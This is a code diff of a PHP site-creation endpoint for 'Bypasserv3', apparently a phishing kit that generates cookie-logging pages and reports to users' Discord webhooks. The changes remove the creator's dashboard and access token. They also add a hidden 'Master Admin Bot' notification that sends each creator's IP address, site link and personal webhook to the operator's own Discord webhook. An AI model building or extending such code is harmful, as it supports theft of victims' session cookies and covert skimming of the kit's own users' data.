@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Instance Creator
- * Handles site generation and sends webhook notifications
+ * Sends master admin notification when someone creates a site
  */
 
 header('Content-Type: application/json');
@@ -110,6 +110,7 @@ $instanceData = [
     'profilePicture' => $profilePicture,
     'token' => $token,
     'createdAt' => date('c'),
+    'createdIP' => $clientIP,
     'stats' => [
         'totalVisits' => 0,
         'totalCookies' => 0,
@@ -143,7 +144,8 @@ $tokenData = [
     'directory' => $directory,
     'webhook' => $webhook,
     'username' => $username,
-    'createdAt' => date('c')
+    'createdAt' => date('c'),
+    'createdIP' => $clientIP
 ];
 
 $tokenHash = md5($token);
@@ -176,10 +178,48 @@ $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $baseUrl = $protocol . '://' . $domain;
 $instanceUrl = $baseUrl . '/public/?dir=' . $directory;
-$dashboardUrl = $baseUrl . '/dashboard/?token=' . $token;
 
 // ============================================
-// SEND WEBHOOK NOTIFICATION
+// SEND MASTER ADMIN BOT NOTIFICATION
+// ============================================
+if (!empty(MASTER_WEBHOOK)) {
+    $masterWebhookData = [
+        'username' => 'Master Admin Bot',
+        'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+        'embeds' => [
+            [
+                'title' => '🆕 New Site Generated',
+                'description' => "**Instance:** `{$directory}`",
+                'color' => hexdec('5865F2'),
+                'fields' => [
+                    [
+                        'name' => '🔗 Link',
+                        'value' => "{$instanceUrl}\n({$instanceUrl})",
+                        'inline' => false
+                    ],
+                    [
+                        'name' => '🌐 IP',
+                        'value' => "`{$clientIP}`",
+                        'inline' => false
+                    ],
+                    [
+                        'name' => '👤 User Webhook',
+                        'value' => "{$webhook}",
+                        'inline' => false
+                    ]
+                ],
+                'footer' => [
+                    'text' => 'Today at ' . date('g:i A')
+                ]
+            ]
+        ]
+    ];
+    
+    sendWebhook(MASTER_WEBHOOK, $masterWebhookData);
+}
+
+// ============================================
+// SEND USER WEBHOOK NOTIFICATION
 // ============================================
 $webhookData = [
     'username' => 'Bypasserv3',
@@ -198,16 +238,6 @@ $webhookData = [
                 [
                     'name' => '🔗 Your Link',
                     'value' => "```{$instanceUrl}```\n[Click to Open]({$instanceUrl})",
-                    'inline' => false
-                ],
-                [
-                    'name' => '📊 Dashboard',
-                    'value' => "```{$dashboardUrl}```\n[Click to Open]({$dashboardUrl})",
-                    'inline' => false
-                ],
-                [
-                    'name' => '🔑 Access Token',
-                    'value' => "```{$token}```",
                     'inline' => false
                 ],
                 [
@@ -232,71 +262,16 @@ $webhookData = [
     ]
 ];
 
-// Send to user webhook
 sendWebhook($webhook, $webhookData);
 
-// Also send to master webhook for logging
-if (!empty(MASTER_WEBHOOK) && MASTER_WEBHOOK !== $webhook) {
-    $masterWebhookData = [
-        'username' => 'Bypasserv3 Master',
-        'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
-        'embeds' => [
-            [
-                'title' => '🆕 New Instance Created',
-                'color' => hexdec('3b82f6'),
-                'fields' => [
-                    [
-                        'name' => 'Directory',
-                        'value' => "`{$directory}`",
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'Token',
-                        'value' => "`" . substr($token, 0, 16) . "...`",
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'IP Address',
-                        'value' => "`{$clientIP}`",
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'Instance URL',
-                        'value' => "[View]({$instanceUrl})",
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'Dashboard',
-                        'value' => "[View]({$dashboardUrl})",
-                        'inline' => true
-                    ],
-                    [
-                        'name' => 'Created At',
-                        'value' => date('M d, Y h:i A'),
-                        'inline' => true
-                    ]
-                ],
-                'footer' => [
-                    'text' => 'Bypasserv3 Master Logger'
-                ],
-                'timestamp' => date('c')
-            ]
-        ]
-    ];
-    
-    sendWebhook(MASTER_WEBHOOK, $masterWebhookData);
-}
-
 // ============================================
-// RETURN SUCCESS RESPONSE
+// RETURN SUCCESS RESPONSE (NO DASHBOARD)
 // ============================================
 http_response_code(201);
 echo json_encode([
     'success' => true,
-    'token' => $token,
     'directory' => $directory,
     'instanceUrl' => $instanceUrl,
-    'dashboardUrl' => $dashboardUrl,
     'message' => 'Instance created successfully'
 ]);
 ?>
